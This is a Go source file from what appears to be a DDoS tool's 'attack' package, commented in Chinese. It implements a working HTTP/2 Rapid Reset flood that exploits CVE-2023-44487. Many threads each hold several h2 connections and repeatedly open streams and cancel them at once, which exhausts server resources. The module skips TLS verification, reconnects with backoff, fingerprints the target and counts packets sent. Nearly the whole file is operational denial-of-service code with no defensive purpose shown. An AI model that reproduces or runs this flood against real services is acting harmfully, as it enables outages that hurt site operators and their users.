package attack

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// ============================================================
// HTTP/2 Rapid Reset (CVE-2023-44487) 洪水：
// 在已建立的 h2 连接上反复 "HEADERS(END_STREAM) → RST_STREAM"，
// 服务器为每个流分配调度/内存资源却收不到请求体，资源只分配不回收。
// 被 RST 的流不计入 SETTINGS_MAX_CONCURRENT_STREAMS，可无限循环。
// 攻击前自动做目标指纹探测（Server 头/ALPN/版本 → CVE 脆弱判定）。
// ============================================================

// newH2Framer 创建基于裸连接的 HTTP/2 帧器
func newH2Framer(conn net.Conn) *http2.Framer {
	return http2.NewFramer(conn, conn)
}

// h2ResetConn 一条 Rapid Reset 连接（帧器 + hpack 编码器 + 流 ID 状态）
type h2ResetConn struct {
	conn     net.Conn
	framer   *http2.Framer
	hpackEnc *hpack.Encoder
	hpackBuf bytes.Buffer
	streamID uint32 // 下一个流 ID（客户端奇数递增）
}

// writeResetStream 编码伪头并发送 HEADERS + RST_STREAM（一个流循环）
func (c *h2ResetConn) writeResetStream(scheme, authority, path string) error {
	c.hpackBuf.Reset()
	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})

	if err := c.framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      c.streamID,
		BlockFragment: c.hpackBuf.Bytes(),
		EndStream:     true, // 立即结束请求方向（无需请求体）
		EndHeaders:    true,
	}); err != nil {
		return err
	}
	if err := c.framer.WriteRSTStream(c.streamID, http2.ErrCodeCancel); err != nil {
		return err
	}
	c.streamID += 2
	return nil
}

// dialH2 建立 h2 连接（TLS+ALPN 或明文 h2c）。
// 返回错误表示目标不支持 h2 / 握手失败。
func dialH2(addr string, useTLS bool, timeout time.Duration) (net.Conn, *http2.Framer, error) {
	d := &net.Dialer{Timeout: timeout}
	var conn net.Conn
	var err error
	if useTLS {
		conn, err = tls.DialWithDialer(d, "tcp", addr, &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2"},
		})
		if err != nil {
			return nil, nil, err
		}
		if cs := conn.(*tls.Conn).ConnectionState(); cs.NegotiatedProtocol != "h2" {
			conn.Close()
			return nil, nil, fmt.Errorf("ALPN negotiated %q, not h2", cs.NegotiatedProtocol)
		}
	} else {
		conn, err = d.Dial("tcp", addr)
		if err != nil {
			return nil, nil, err
		}
	}

	framer := newH2Framer(conn)
	// HTTP/2 客户端连接前言（Framer 不提供，需手动发送）
	if _, err := conn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")); err != nil {
		conn.Close()
		return nil, nil, err
	}
	if err := framer.WriteSettings(); err != nil {
		conn.Close()
		return nil, nil, err
	}
	// 读服务器 SETTINGS（确认 h2 会话；短窗口，失败也继续——发送不受影响）
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	for i := 0; i < 4; i++ {
		f, err := framer.ReadFrame()
		if err != nil {
			break
		}
		if _, ok := f.(*http2.SettingsFrame); ok {
			break
		}
	}
	conn.SetReadDeadline(time.Time{})
	return conn, framer, nil
}

// resetConnsPerThread 每线程连接槽数：单连接受 TCP 窗口限制（RTT 高时
// 帧率被 ACK 节奏锁死），多槽并行写 + 槽间互相隐藏拨号 RTT。
const resetConnsPerThread = 4

// StartHTTP2ResetEx HTTP/2 Rapid Reset 洪水。
// threads = 并发线程；每线程 resetConnsPerThread 条连接并行建流/重置。
// PacketSize 控制随机路径长度（默认 16，范围 1-512）。
func StartHTTP2ResetEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "http2_reset", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	targets := resolveTargetStrings(cfg)
	if len(targets) == 0 {
		s.abort()
		return s
	}

	// 指纹探测（异步：不阻塞攻击启动；结果仅日志，含 CVE-2023-44487 脆弱判定）
	t0 := targets[0]
	if !strings.HasPrefix(t0, "http") {
		t0 = "http://" + t0
	}
	go func() {
		logFingerprint(FingerprintL7Target(t0, 4*time.Second))
	}()

	useTLS := strings.HasPrefix(t0, "https")
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	authority := hostOnly(t0)
	addr := hostPort(t0)

	pathLen := cfg.PacketSize
	if pathLen < 1 || pathLen > 512 {
		pathLen = 16
	}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()
				rng := NewFastRNG(time.Now().UnixNano() + seed)
				endTime := time.Now().Add(dur)

				path := "/" + randomAlpha(rng, pathLen-1)
				if pathLen < 2 {
					path = "/"
				}

				var slotWG sync.WaitGroup
				for slot := 0; slot < resetConnsPerThread; slot++ {
						slotWG.Add(1)
						go func() {
							defer slotWG.Done()
							tc := newTimeCache()
							var conn net.Conn
							var rc *h2ResetConn
							backoff := 100 * time.Millisecond
							const maxBackoff = 5 * time.Second

							// 拨号/重连：指数退避重试，避免目标不可达时浪费 CPU
							ensureConn := func() bool {
								if rc != nil {
									return true
								}
								c, framer, err := dialH2(addr, useTLS, 5*time.Second)
								if err != nil {
									atomic.AddUint64(&s.Stats.Errors, 1)
									time.Sleep(backoff)
									backoff *= 2
									if backoff > maxBackoff {
										backoff = maxBackoff
									}
									return false
								}
								// 连接成功，重置退避时间
								backoff = 100 * time.Millisecond
								conn = c
								rc = &h2ResetConn{conn: conn, framer: framer, streamID: 1}
								rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
								return true
							}

						for tc.since(endTime) < 0 {
							select {
							case <-s.StopChan:
								if conn != nil {
									conn.Close()
								}
								return
							default:
							}

							if !ensureConn() {
								continue
							}
							if !s.checkRate(63) { // HEADERS(~50B) + RST(13B)
								time.Sleep(time.Microsecond * 100)
								continue
							}

							if err := rc.writeResetStream(scheme, authority, path); err != nil {
								// 连接损坏：关闭，下一轮重连（流 ID 随连接重置）
								conn.Close()
								conn, rc = nil, nil
								atomic.AddUint64(&s.Stats.Errors, 1)
								continue
							}
							atomic.AddUint64(&s.Stats.PacketsSent, 1)
							atomic.AddUint64(&s.Stats.BytesSent, 63)
							tc.refresh()
						}
						if conn != nil {
							conn.Close()
						}
					}()
				}
				slotWG.Wait()
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}

// hostOnly 提取 host[:port] 的主机部分
func hostOnly(target string) string {
	u, err := url.Parse(target)
	if err != nil {
		return target
	}
	return u.Hostname()
}

// hostPort 提取 host:port（无端口时按 scheme 补默认端口）
func hostPort(target string) string {
	u, err := url.Parse(target)
	if err != nil {
		return target
	}
	host := u.Host
	if _, _, err := net.SplitHostPort(host); err != nil {
		if u.Scheme == "https" {
			host = host + ":443"
		} else {
			host = host + ":80"
		}
	}
	return host
}
